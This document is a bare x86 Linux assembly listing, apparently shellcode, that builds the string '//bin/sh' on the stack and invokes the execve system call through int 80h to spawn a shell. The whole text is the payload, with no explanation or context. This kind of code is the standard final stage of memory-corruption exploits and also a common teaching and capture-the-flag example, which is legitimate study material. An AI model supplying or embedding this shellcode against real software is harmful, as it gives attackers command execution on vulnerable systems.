xor eax,eax
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
mov ecx,eax
sub eax,-0x0b
int 80h